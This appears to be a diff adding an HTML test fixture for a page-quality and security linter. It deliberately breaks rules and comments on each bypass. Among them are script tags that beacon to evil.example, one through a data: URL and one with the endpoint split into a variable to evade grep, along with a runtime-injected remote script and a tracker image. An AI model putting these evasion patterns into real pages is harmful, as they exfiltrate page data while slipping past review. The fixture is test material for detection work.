@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="en" data-voice="ledger">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Every gate cleared by spelling around it. Built to exit 1; each line is a closed bypass.">
+<title>Latency Budget Review</title>
+<!--
+  ARTIFACT CONTRACT
+  audience=x
+  question=x
+  verdict=x
+  consequence=x
+  challenge=x
+  structure=x
+  spine=x
+  transition-type=x
+  evidence=x
+  visuals=x
+  voice=ledger
+  generic-check=x
+  allow: q.slop.1  allow: q.slop.2  allow: q.slop.12  allow: q.slop.16  allow: q.slop.18
+-->
+<style>
+:root { --ink: #1a1a1a; --paper: #fafafa; --rule: #c9c4bb; --accent: #7a2e1f; --measure: 34em;
+        --ui-face: Inter, sans-serif; }
+*, *::before, *::after { box-sizing: border-box; }
+body { color: #1a1a1a; background-color: #fafafa; font-family: var(--ui-face); line-height: 1.6; margin: 0; padding: 2rem; }
+p, li, figcaption { max-inline-size: var(--measure); }
+h1 { font-size: 2rem; font-weight: 800; }
+h2 { font-size: 1.25rem; font-weight: 200; }
+
+/* q.slop.1: the AI indigo, written in rgb() so the hex grep sees nothing. */
+.brand { color: rgb(99, 102, 241); }
+.hero  { background: linear-gradient(135deg, rgb(99,102,241), rgb(168,85,247)); }
+/* q.slop.12: -.5rem has no digit after the minus. */
+.lift  { transition: all 200ms ease; }
+.lift:hover { transform: translateY(-.5rem); }
+/* q.slop.16: three selectors, one rule object. */
+.a, .b, .c { text-align: center; }
+/* q.slop.6 + card soup: six two-child cards, a 3-character signature. */
+.grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; }
+.card { border: 1px solid var(--rule); padding: 1rem; }
+/* mo.detect: animation longhands, no `animation:` shorthand anywhere. */
+.pulse { animation-name: pulse; animation-duration: 3s; animation-iteration-count: infinite; }
+@keyframes pulse { from { opacity: .6 } to { opacity: 1 } }
+/* mo.fallback: a reduce block that cancels nothing. */
+@media (prefers-reduced-motion: reduce) { .nothing-here { color: inherit; } }
+/* a11y.focus: declares a visual property, paints no ring. */
+:focus-visible { outline-color: red; }
+@media (max-width: 720px) { body { padding: 1rem; } }
+@media print {
+  nav, .no-print, button { display: none; }
+  figure, table { break-inside: avoid; }
+  a[href^="http"]::after { content: " (" attr(href) ")"; }
+}
+</style>
+<!-- sc.subresource: a second file, and a data: URL the syntax gate skips as "not JavaScript". -->
+<script src="app.js"></script>
+<script src="data:text/javascript,fetch('https://evil.example/beacon?k='+document.title)"></script>
+<script>
+// sc.js: the literal never sits next to the call.
+const ENDPOINT = 'https://evil.example/exfil';
+fetch(ENDPOINT);
+const s = document.createElement('script');
+s.setAttribute('src', 'https://cdn.example/late.js');
+document.head.appendChild(s);
+</script>
+</head>
+<body>
+<main>
+<h1>Latency Budget Review</h1>
+
+<section>
+<h2>What the load run measured</h2>
+<figure id="fig-lat"><pre>host a  240 ms -&gt; 505 ms</pre>
+<figcaption>Build 811 first, build 830 second.</figcaption></figure>
+
+<!-- sc.css: a style attribute is CSS that never reaches &lt;style&gt;. -->
+<div class="pulse" style="background-image:url(https://evil.example/tracker.png); transition: all 2s ease">tracker</div>
+<!-- sc.subresource: the remote candidate is second, so the value does not start with https. -->
+<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="
+     srcset="data:image/gif;base64,R0lGODlhAQABAAAAACw= 1x, https://cdn.example/hero@2x.png 2x"
+     alt="hero">
+<div class='hero-graphic'>q.slop.18: single-quoted class attribute</div>
+
+<!-- k.report: a numeric series typed as a list instead of a table. -->
+<ul><li>build 805: 231 ms</li><li>build 811: 240 ms</li><li>build 818: 262 ms</li>
+<li>build 823: 301 ms</li><li>build 826: 447 ms</li><li>build 830: 505 ms</li></ul>
+</section>
+
+<section>
+<h2>Metrics</h2>
+<div class="grid">
+<div class="card"><h3>Metric 1</h3><p>value 1</p></div>
+<div class="card"><h3>Metric 2</h3><p>value 2</p></div>
+<div class="card"><h3>Metric 3</h3><p>value 3</p></div>
+<div class="card"><h3>Metric 4</h3><p>value 4</p></div>
+<div class="card"><h3>Metric 5</h3><p>value 5</p></div>
+<div class="card"><h3>Metric 6</h3><p>value 6</p></div>
+</div>
+</section>
+
+<section>
+<h2>What holds the train</h2>
+<!-- ev.band: the band contradicts the word and prints no parentheses. -->
+<p>We judge a serializer regression very likely, 20-45% by our own count, and rate a network cause unlikely: 80-95%.</p>
+<!-- ev.sha: bare text, a capitalised host, and a data-url slot — none of them an anchor href. -->
+<p>Source: https://github.com/acme/checkout/blob/main/src/serialize.ts#L41-L46, mirrored at
+<a href="https://GitHub.com/acme/checkout/blob/release-2026-08/src/pool.ts#L12">pool.ts</a>,
+<span data-url="https://github.com/acme/checkout/blob/trunk/src/x.ts" data-retrieved="2026-08-12">trunk</span>.</p>
+<p>The rise reproduces on every host in the pool, so a single degraded machine does not account for it.
+The release train holds until the flame graph on build 830 names the frame that grew. The serializer
+landed in build 826 and is the only change on the hot path between the two builds under comparison,
+which is the reason the pool-wide shape of the regression matters more than any single host reading.
+Thirty minutes of steady-state load per host is enough to separate a warm-cache artefact from a real
+change in the work the request does, and the four hosts agree to within eleven milliseconds at p99.</p>
+<!-- ev.density: one throwaway claim, reported as 100% coverage over the whole argument. -->
+<span data-claim="assumed">the pool is homogeneous</span>
+</section>
+
+</main>
+</body>
+</html>
